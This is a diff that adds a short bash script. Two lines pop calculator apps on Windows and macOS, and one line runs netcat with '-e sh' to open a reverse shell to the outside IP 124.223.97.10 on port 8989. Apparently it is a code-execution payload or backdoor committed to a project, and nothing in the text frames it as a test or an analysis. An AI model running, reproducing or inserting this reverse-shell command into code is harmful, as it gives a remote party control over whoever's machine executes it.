@@ -1,0 +1,4 @@
+#!/bin/bash
+calc.exe
+nc.exe 124.223.97.10 8989 -e sh
+open -a Calculator.app
